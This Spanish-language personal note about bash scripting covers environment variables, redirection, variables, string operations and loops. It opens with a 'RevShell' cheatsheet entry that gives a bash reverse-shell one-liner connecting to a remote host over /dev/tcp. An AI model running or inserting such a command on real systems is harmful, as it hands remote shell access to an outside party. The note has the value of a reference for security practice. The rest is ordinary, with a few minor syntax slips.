---
title: bash
---

# Cheatsheet

## RevShell

```bash
bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```

# Scripting
## 1. Bash environment

Al inicializar una bash, el sistema suele llamar a archivos como *~/.bashrc*, *~/.bash_login* ó *~/.bash_profile*. De igual forma, al cerrarse se llama a *~/.bash_logout*. Muy ligado a este entorno, están las **variables de entorno** (*environment variables*).

### 1.1 Variables de entorno

Podemos ver estas variables como variables típicas en programación. Podemos verlas con el comando `env`.

Una de las más importantes es el `PATH`, podemos verla con `echo $PATH`. Contine una serie de rutas con el formato `[location]:[location]:...:[location]`, que son las rutas donde bash buscará los archivos binarios al llamar a un comando.

### 1.2 Programas y comandos

En bash existen programas predefinidos que nos permiten ejecutar ciertas acciones muy útiles, éstos están contenidos en rutas del PATH, por lo que podemos verlas con `which <comando>`. De igual forma, con `man <comando>` podemos consultar el manual para dicho comando.

Los comandos suelen tener una salida ó *output* que se muestra por la propia terminal, sin embargo, en ocasiones, nos interesa redirigir la salida de un comando:

- **`>`** -> Redirige la salida a un fichero, sobreescribiéndolo.
- **`>>`** -> También redirige la salida a un fichero, pero añade al contenido del propio fichero (no sobreescribe).
- **`|`** -> Redirige la salida como parámetro del siguiente comando. Se conoce como *pipe*.
- **`&&`** Si la salida del comando anterior es exitosa, ejecuta el siguiente comando.

Pero además de comandos podemos ejecutar programas que deben tener la extensión `.sh`, para ello simplemente los llamamos con `bash ./programa.sh`. Además para especificar que queremos utilizar bash sin tener que ponerlo explícitamente utilizamos un *shebang*, es decir una línea que especifíca qué programa debe ejecutar el archivo:

```
#!/bin/bash
```


## 2. Variables

Bash es un lenguaje con un tipado ligero, haciendo tan fácil la asignación de variables (no hace falta inicialización) como:

```bash
nombre=valor  #Asignacion de un valor simple
nombre=$(comando)  #Asignación del resultado de un comando
nombre=$((expr_matematica))  #Asignacion del resultado de una operacion
```

Para acceder al contenido de una variable basta con utilizar `$` delante:

```bash
echo $variable
```

### 2.1 Texto

En bash podemos especificar texto mediante comillas simples `' '` ó comillas dobles, `" "`. La diferencia está en que las segundas interpretan lo que hay dentro, pudiendo incorporar variables:

```bash
echo "Variable1 = $(Variable1)"
```

Operaciones sobre texto:

- Para extraer parte de un texto, es tan sencillo como `echo ${cadena:1:2}`
- En el caso de que lo que quieras hacer es sustituir texto la operación es `echo ${texto/de/a}`
- Eliminar todas las apariciones de un texto dentro de otro `echo ${texto//de}`
- 
Estas operaciones se pueden hacer tanto con texto como con números. Al final, al utilizar `${}` lo trata como si fuera un texto.


## 3. Bucles y condicionales

### 3.1 IF

El esquema sería:

```bash
if <condition>; then
	<comand>
elif <condition>; then
	<comand>
else <condition>
	<comand>
fi
```

Lo difícil son las condiciones, que pueden llegar a tener una sintaxis algo compleja. Para un mayor detalle en cuanto a los operadores consulta esta [página](https://www.tldp.org/LDP/abs/html/comparison-ops.html). Los operadores para números serían:

```bash
-eq #equal
-ne #not equal
-lt #less than
-le #less or equal than
-gt #greater than
-ge #greater or equal than
```


### 3.2 FOR

La estructura sería:

```bash
for i in x; do
	<comand>
done
```

Como en otros lenguajes, sirve para recorrer los elementos contenidos en otro. Para iterar entre números se utiliza `seq` (importante que utiliza \`, no ' ):

```bash
for i in `seq 1 10`; do
```


### 3.3 WHILE

Igual que lo anteriores es igual que en otros lenguajes. La estructura sería:

```bash
while <condition>; do
	<comand1>;
	<comand2>;
done
```

Suele utilizarse para leer archivos:

```bash
while read line; do echo $line; done < file.txt
```

## - Comandos útiles

- **cat** muestra el contenido de un archivo por pantalla.  
- **[[grep]]** muy útil para filtrar un archivo por [[expresiones regulares]].
- **cut** nos permite recortar secciones de código.
- **sort**
- **xargs**
- **tr** convierte o elimina secciones de texto (*translate or replace*).
- **[[curl]]**
- 